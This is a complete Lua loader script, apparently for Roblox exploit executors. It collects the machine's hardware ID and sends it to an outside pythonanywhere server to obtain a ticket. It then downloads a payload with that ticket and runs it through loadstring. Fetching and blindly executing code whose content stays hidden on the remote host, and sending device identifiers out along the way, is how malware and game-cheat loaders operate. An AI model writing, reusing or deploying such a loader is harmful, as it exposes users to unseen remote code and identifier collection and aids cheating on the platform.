local hwid = (gethwid and gethwid()) or (syn and syn.get_hwid and syn.get_hwid()) or game:GetService("RbxAnalyticsService"):GetClientId()
local req = (request or http_request or (syn and syn.request))
if not req then return warn("No HTTP support!") end

local tRes = req({
    Url = "https://yonni1010.pythonanywhere.com/get_ticket/jodnxxoz0qav",
    Method = "GET",
    Headers = { ["X-Client-HWID"] = tostring(hwid), ["X-Vault-Source"] = "OfficialLoader" }
})

if tRes.StatusCode ~= 200 then return warn("Auth Failed: " .. tostring(tRes.Body)) end
local ticket = tRes.Body

local pRes = req({
    Url = "https://yonni1010.pythonanywhere.com/redeem_payload?ticket=" .. tostring(ticket),
    Method = "GET",
    Headers = { ["X-Client-HWID"] = tostring(hwid), ["X-Vault-Source"] = "OfficialLoader" }
})

if pRes.StatusCode == 200 then
    local f, err = loadstring(pRes.Body)
    if f then pcall(f) else warn("Exec Error: " .. tostring(err)) end
else
    warn("Vault Error: " .. tostring(pRes.Body))
end